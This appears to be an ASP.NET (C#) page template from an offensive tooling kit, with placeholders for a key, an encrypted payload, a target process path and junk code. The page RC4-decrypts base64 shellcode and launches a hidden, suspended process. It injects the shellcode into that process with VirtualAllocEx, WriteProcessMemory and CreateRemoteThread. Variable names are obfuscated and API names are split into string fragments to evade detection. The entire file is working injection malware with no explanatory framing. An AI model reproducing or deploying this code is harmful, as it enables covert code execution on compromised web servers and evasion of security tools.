<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Collections.ObjectModel" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="Microsoft.Build.Utilities" %>
<%@ Import Namespace="Microsoft.Build.Framework" %>

<script Language="c#" runat="server">

public const uint VAR77 = 0x80000004;

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
public struct VAR46 {
	public IntPtr VAR91;
	public IntPtr VAR92;
	public Int32 VAR93;
	public Int32 VAR94;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
public struct VAR47 {
	public uint VAR81;
	public string VAR82;
	public string VAR83;
	public string VAR84;
	public uint VAR85;
	public uint VAR86;
	public uint VAR87;
	public uint VAR88;
	public uint VAR89;
	public uint VAR99;
	public uint VAR98;
	public uint VAR97;
	public short VAR96;
	public short VAR95;
	public IntPtr VAR94;
	public IntPtr VAR93;
	public IntPtr VAR92;
	public IntPtr VAR91;
}

[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
static extern bool CreateProcess(string VAR56, string VAR57, IntPtr VAR58, IntPtr VAR59, bool VAR60, uint VAR61, IntPtr VAR62, string VAR63, [In] ref VAR47 VAR64, out VAR46 VAR65);

private static UInt32 VAR40 = 0x3000;
private static UInt32 VAR41 = 0x40;
[DllImport("kernel32")]
private static extern IntPtr VirtualAllocEx(IntPtr hProcess, UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
private delegate IntPtr VAR32(IntPtr hProcess, IntPtr VAR7, UInt32 VAR32, IntPtr VAR1, IntPtr VAR8, UInt32 VAR40, ref UInt32 VAR26);
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string VAR17);
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr VAR5, string VAR26);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr VAR41, IntPtr VAR42, byte[] VAR43, Int32 VAR44, out IntPtr VAR45);

[JUNK1]
byte[] VAR9 = {[KEY]};
string VAR7 = VAR60.VAR61("[PAYLOAD]");
byte[] VAR10 = Convert.FromBase64String(VAR7);
byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);

IntPtr VAR33 = LoadLibrary("kerne"+"l32.d"+"ll");
[JUNK2]
IntPtr VAR34 = GetProcAddress(VAR33, "Crea"+"t"+"eRe"+"mot"+"eTh"+"read");
VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
[JUNK3]

VAR47 VAR38 = new VAR47();
VAR46 VAR39 = new VAR46();
CreateProcess(null, "[PROCESSPATH]", IntPtr.Zero, IntPtr.Zero, false, VAR77, IntPtr.Zero, null, ref VAR38, out VAR39);
IntPtr VAR13 = VAR39.VAR91;

IntPtr VAR42 = VirtualAllocEx(VAR13, 0, (UInt32)VAR11.Length, VAR40, VAR41);

IntPtr VAR43 = IntPtr.Zero;
IntPtr VAR44 = IntPtr.Zero;
UInt32 VAR45 = 0;
WriteProcessMemory(VAR13, VAR42, VAR11, VAR11.Length, out VAR43);
VAR43 = VAR35(VAR13, IntPtr.Zero, 0, (IntPtr)VAR42, VAR44, 0, ref VAR45);


public class VAR60 {
	public static string VAR61(string VAR62) {
		string VAR63 = "[PATTERN_1]";
		string VAR64 = "[PATTERN_2]";
		return VAR62.Replace(VAR63, "m").Replace(VAR64, "V");
	}
}

public class VAR16 {
	public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
		int VAR20, VAR21, VAR22, VAR23, VAR24;
		int[] VAR25, VAR26;
		byte[] VAR27;

		VAR25 = new int[256];
		VAR26 = new int[256];
		VAR27 = new byte[VAR19.Length];

		for (VAR21 = 0; VAR21 < 256; VAR21++) {
			VAR25[VAR21] = VAR18[VAR21 % VAR18.Length];
			VAR26[VAR21] = VAR21;
		}
		for (VAR22 = VAR21 = 0; VAR21 < 256; VAR21++) {
			VAR22 = (VAR22 + VAR26[VAR21] + VAR25[VAR21]) % 256;
			VAR24 = VAR26[VAR21];
			VAR26[VAR21] = VAR26[VAR22];
			VAR26[VAR22] = VAR24;
		}
		for (VAR20 = VAR22 = VAR21 = 0; VAR21 < VAR19.Length; VAR21++) {
			VAR20++;
			VAR20 %= 256;
			VAR22 += VAR26[VAR20];
			VAR22 %= 256;
			VAR24 = VAR26[VAR20];
			VAR26[VAR20] = VAR26[VAR22];
			VAR26[VAR22] = VAR24;
			VAR23 = VAR26[((VAR26[VAR20] + VAR26[VAR22]) % 256)];
			VAR27[VAR21] = (byte)(VAR19[VAR21] ^ VAR23);
		}
		return VAR27;
	}

	public static byte[] VAR28(byte[] VAR29, byte[] VAR30) {
		return VAR17(VAR29, VAR30);
	}
}
</script>
